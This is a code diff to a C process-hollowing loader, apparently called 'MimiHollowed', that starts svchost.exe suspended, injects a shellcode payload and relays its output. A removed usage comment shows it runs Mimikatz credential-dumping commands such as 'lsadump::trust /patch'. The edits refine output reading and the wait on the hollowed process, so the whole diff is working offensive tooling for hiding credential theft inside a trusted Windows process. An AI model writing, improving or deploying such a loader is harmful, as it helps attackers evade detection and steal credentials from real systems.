@@ -86,24 +86,23 @@ BOOL AdjustMemoryProtections(IN HANDLE hTargetProc, IN ULONG_PTR uBaseAddr, IN P
 }
 
 VOID DisplayProcessOutput(IN HANDLE hOutputPipe) {
-    BOOL bSuccess = TRUE;
-    do {
-        DWORD dwBytesAvailable = 0;
-        BYTE* pOutputData = NULL;
+    DWORD dwBytesAvailable = 0;
+    BYTE* pOutputData = NULL;
 
-        PeekNamedPipe(hOutputPipe, NULL, NULL, NULL, &dwBytesAvailable, NULL);
+    // Check if there's data to read without removing it
+    if (PeekNamedPipe(hOutputPipe, NULL, 0, NULL, &dwBytesAvailable, NULL) && dwBytesAvailable > 0) {
+        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable + 1); // +1 for null terminator
+        if (!pOutputData) return;
 
-        pOutputData = (BYTE*)LocalAlloc(LPTR, dwBytesAvailable);
-        if (!pOutputData) break;
-
-        if (!(bSuccess = ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, NULL, NULL))) {
-            LocalFree(pOutputData);
-            break;
+        DWORD dwBytesRead = 0;
+        if (ReadFile(hOutputPipe, pOutputData, dwBytesAvailable, &dwBytesRead, NULL)) {
+            if (dwBytesRead > 0) {
+                pOutputData[dwBytesRead] = '\0'; // Ensure null-terminated
+                printf("%.*s", dwBytesRead, pOutputData);
+            }
         }
-
-        printf("%.*s", dwBytesAvailable, pOutputData);
         LocalFree(pOutputData);
-    } while (bSuccess);
+    }
 }
 
 BOOL SpawnSuspendedProcess(IN LPCSTR szProcessPath, IN OPTIONAL LPCSTR szArguments,
@@ -244,12 +243,24 @@ BOOL DeployPayload(IN BYTE* pPayloadData, IN LPCSTR szTargetPath, IN OPTIONAL LP
     }
 
     if (ResumeThread(stProcInfo.hThread) == (DWORD)-1) {
-        printf("ResumeThread, error: %lu", GetLastError());
+        printf("ResumeThread, error: % lu", GetLastError());
         goto CLEANUP;
     }
 
-    WaitForSingleObject(stProcInfo.hProcess, INFINITE);
+    DWORD dwExitCode = STILL_ACTIVE;
+    while (TRUE) {
+        if (!GetExitCodeProcess(stProcInfo.hProcess, &dwExitCode)) {
+            printf("GetExitCodeProcess failed: %lu", GetLastError());
+            break;
+        }
+        if (dwExitCode != STILL_ACTIVE) break;
+
+        DisplayProcessOutput(hOutputPipe);
+        Sleep(100);
+    }
+
     DisplayProcessOutput(hOutputPipe);
+
     bSuccess = TRUE;
 
 CLEANUP:
@@ -263,9 +274,6 @@ CLEANUP:
 #define TARGET_APP_PATH "C:\\Windows\\System32\\svchost.exe"
 
 int main(int argc, char* argv[]) {
-    /*
-        DUMMY USAGE EXAMPLE: MimiHollowed.exe coffee "lsadump::trust /patch" coffee (you can wrap any command in double quotes if it contains spaces)
-    */
     BYTE* pPayloadData = NULL;
     DWORD dwPayloadSize = LoadShellcodeIntoMemory((VOID**)&pPayloadData);
     CHAR* pPeArgs = NULL;
@@ -332,6 +340,6 @@ int main(int argc, char* argv[]) {
     else {
         pPeArgs = "coffee exit";
     }
-
+    
     return DeployPayload(pPayloadData, TARGET_APP_PATH, pPeArgs) ? EXIT_SUCCESS : EXIT_FAILURE;
 }
